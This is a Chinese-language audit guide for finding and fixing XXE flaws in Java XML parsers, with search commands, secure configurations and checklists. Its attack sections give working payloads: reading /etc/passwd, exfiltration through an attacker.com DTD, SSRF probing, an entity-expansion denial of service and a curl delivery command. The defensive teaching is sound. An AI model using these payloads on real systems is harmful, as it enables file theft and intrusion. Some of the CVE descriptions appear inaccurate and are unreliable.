# Java XXE (XML External Entity) - XXE 漏洞完整审计规则

> XML 外部实体注入漏洞深度分析
> 基于 javasec 项目学习成果 + 真实审计遗漏案例反思

---

## ⚠️ 审计警告 - 常见遗漏点

```
┌─────────────────────────────────────────────────────────────────┐
│  XXE 审计最常见的三个遗漏：                                       │
│                                                                 │
│  1. 只检查核心模块，漏掉 plugins/extensions 中的 XML 解析         │
│  2. 看到有 setFeature 就认为安全，不验证是否设置了所有必要配置     │
│  3. 只搜索明显的解析器，漏掉 DomHelper 等包装类                   │
│                                                                 │
│  ⚠️ 只设置 FEATURE_SECURE_PROCESSING 不够！                      │
│  ⚠️ 必须显式设置 disallow-doctype-decl = true！                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 漏洞原理

XXE (XML External Entity Injection) 是一种针对解析 XML 输入的应用程序的攻击。

**可实现的攻击**:
- ✅ 读取本地文件
- ✅ 内网端口扫描 (SSRF)
- ✅ 拒绝服务攻击 (Billion Laughs)
- ✅ OOB 数据外带

**基本 Payload**:
```xml
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

---

## 危险的 XML 解析类（完整清单）

| 解析类 | 包名 | 风险 | 搜索命令 |
|--------|------|------|----------|
| `DocumentBuilder` | `javax.xml.parsers` | ⚠️ 高危 | `grep -rn "DocumentBuilder"` |
| `SAXParser` | `javax.xml.parsers` | ⚠️ 高危 | `grep -rn "SAXParser"` |
| `SAXReader` | `org.dom4j.io` | ⚠️ 高危 | `grep -rn "SAXReader"` |
| `SAXBuilder` | `org.jdom2.input` | ⚠️ 高危 | `grep -rn "SAXBuilder"` |
| `XMLReader` | `org.xml.sax` | ⚠️ 高危 | `grep -rn "XMLReader"` |
| `XMLInputFactory` | `javax.xml.stream` | ⚠️ 高危 | `grep -rn "XMLInputFactory"` |
| `TransformerFactory` | `javax.xml.transform` | ⚠️ 高危 | `grep -rn "TransformerFactory"` |
| `Validator` | `javax.xml.validation` | ⚠️ 高危 | `grep -rn "Validator\|SchemaFactory"` |
| `Unmarshaller` | `javax.xml.bind` | ⚠️ 高危 | `grep -rn "Unmarshaller"` |
| `Digester` | `org.apache.commons.digester` | ⚠️ 高危 | `grep -rn "Digester"` |
| `DomHelper` | 各框架自定义 | ⚠️ **常被遗漏** | `grep -rn "DomHelper\|XmlHelper\|XmlUtil"` |

**默认都不安全** - 需要手动配置防御！

### 必须搜索所有模块

```bash
# 一次性搜索所有 XML 解析器（在项目根目录执行）
grep -rn "DocumentBuilderFactory\|SAXParserFactory\|XMLInputFactory\|TransformerFactory\|SAXReader\|SAXBuilder\|XMLReader\|Digester\|DomHelper\|XmlHelper" --include="*.java"

# 包括插件目录
find . -name "*.java" -exec grep -l "DocumentBuilder\|SAXParser\|XMLReader" {} \;
```

---

## 代码审计检测

### 搜索命令

```bash
# 检测 XML 解析类
grep -rn "DocumentBuilder\|SAXParser\|SAXReader\|SAXBuilder" --include="*.java"

# 检测防御配置
grep -rn "setFeature.*disallow-doctype" --include="*.java"

# 检测 parse 方法
grep -rn "\.parse\(" --include="*.java" | grep -E "DocumentBuilder|SAXParser"
```

### 漏洞模式

**危险代码**:
```java
// ❌ 未配置防御
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
builder.parse(userInput);  // 用户可控 = XXE
```

**安全代码**:
```java
// ✓ 正确防御
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
DocumentBuilder builder = factory.newDocumentBuilder();
```

---

## 攻击向量

### 1. 读取本地文件

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### 2. OOB 数据外带

**本地 XML**:
```xml
<!DOCTYPE root [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
    %remote;
    %send;
]>
```

**远程 evil.dtd**:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### 3. 内网扫描 (SSRF)

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://192.168.1.1:80/">]>
<root>&xxe;</root>
```

### 4. 拒绝服务

```xml
<!DOCTYPE root [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<root>&lol2;</root>
```

---

## 防御措施

### DocumentBuilderFactory

```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// 完全禁用 DTD (推荐)
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// 或禁用外部实体
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
```

### SAXParserFactory

```java
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

### dom4j SAXReader

```java
SAXReader reader = new SAXReader();
reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
```

### TransformerFactory

```java
TransformerFactory factory = TransformerFactory.newInstance();
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
```

---

## 实战 PoC

### PoC 1: DocumentBuilder XXE

**漏洞代码**:
```java
import javax.xml.parsers.*;
import org.w3c.dom.*;

public class XXEVuln {
    public static void main(String[] args) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document doc = builder.parse(args[0]);  // ⚠️ XXE
        
        NodeList nodes = doc.getElementsByTagName("data");
        System.out.println(nodes.item(0).getTextContent());
    }
}
```

**利用**:
```bash
echo '<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>' > payload.xml

java XXEVuln payload.xml  # ✅ 读取 /etc/passwd
```

### PoC 2: CVE-2017-5645 (Log4j XXE)

**影响**: Apache Log4j 2.0-alpha1 ~ 2.8.1

**Payload**:
```xml
<?xml version="1.0"?>
<!DOCTYPE log4j:configuration [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<log4j:configuration><logger name="&xxe;"/></log4j:configuration>
```

---

## 审计 Checklist（强制验证矩阵）

### Phase 1: 全面搜索（不可跳过任何模块）

- [ ] **核心模块** (core, main)
- [ ] **所有插件** (plugins/*, struts2-*-plugin)
- [ ] **扩展模块** (extensions/*, extras/*)
- [ ] **测试代码** (test/*, **/test/**)
- [ ] **示例代码** (examples/*, samples/*)

### Phase 2: 解析器完整清单

| 解析器 | 已搜索 | 发现数量 | 安全状态 |
|--------|--------|----------|----------|
| DocumentBuilderFactory | [ ] | | |
| SAXParserFactory | [ ] | | |
| XMLInputFactory | [ ] | | |
| TransformerFactory | [ ] | | |
| SAXReader (dom4j) | [ ] | | |
| SAXBuilder (jdom) | [ ] | | |
| XMLReader | [ ] | | |
| Digester | [ ] | | |
| DomHelper/XmlHelper | [ ] | | |
| SchemaFactory/Validator | [ ] | | |

### Phase 3: 防护配置完整性验证（缺一不可）

**对于每个发现的 XML 解析器，必须验证以下所有配置**：

| 配置项 | 状态 | 重要性 |
|--------|------|--------|
| `disallow-doctype-decl = true` | [ ] | **关键！常被遗漏** |
| `external-general-entities = false` | [ ] | 高 |
| `external-parameter-entities = false` | [ ] | 高 |
| `load-external-dtd = false` | [ ] | 高 |
| `setXIncludeAware(false)` | [ ] | 中 |
| `setExpandEntityReferences(false)` | [ ] | 中 |

```
⚠️ 警告：
- 只设置 FEATURE_SECURE_PROCESSING 是不够的！
- 必须显式设置 disallow-doctype-decl = true
- 缺少任何一项都可能导致 XXE 可利用
```

### Phase 4: 入口点追踪

- [ ] 搜索所有 `Content-Type: application/xml` 端点
- [ ] 搜索所有 `Content-Type: text/xml` 端点
- [ ] 检查文件上传是否接受 XML 文件
- [ ] 检查 SOAP 端点
- [ ] 检查配置文件热加载功能

```bash
# 搜索 XML Content-Type 端点
grep -rn "application/xml\|text/xml\|consumes.*xml" --include="*.java"
```

### Phase 5: 验证与记录

- [ ] 确认 XML 输入来源是否用户可控
- [ ] 测试 DTD 注入
- [ ] 验证防御有效性
- [ ] 检查错误信息是否泄露文件内容
- [ ] 记录所有发现，包含 文件:行号

---

## 真实案例：Struts XXE 审计遗漏

### 遗漏原因分析

```
1. 只检查了核心模块
   - 漏掉了 embeddedjsp 插件
   - 漏掉了 rest 插件

2. 误判 DomHelper
   - 看到有 setFeature 就认为安全
   - 没有验证是否设置了 disallow-doctype-decl

3. 未追踪 XML 入口点
   - 没有搜索所有 application/xml 端点
```

### 教训

| 教训 | 说明 |
|------|------|
| 全面扫描 | 必须检查所有插件和依赖模块 |
| XXE 防护清单 | 必须同时禁用 DOCTYPE 和外部实体 |
| 入口点分析 | 追踪所有接受 XML 输入的 HTTP 端点 |

---

## 相关 CVE

| CVE | 组件 | 描述 |
|-----|------|------|
| CVE-2017-5645 | Log4j 2.x | TcpSocketServer XXE |
| CVE-2017-12629 | Apache Solr | DocumentBuilder XXE |
| CVE-2018-1000058 | Jenkins | Config XML XXE |

---

## 最小 PoC 示例
```bash
# XXE 读取文件
cat > payload.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
EOF
curl -X POST -H "Content-Type: application/xml" --data-binary @payload.xml http://localhost:8080/xml
```

---

**最后更新**: 2024-12-26  
**版本**: 1.0  
**审计重点**: setFeature 配置、XML 输入来源
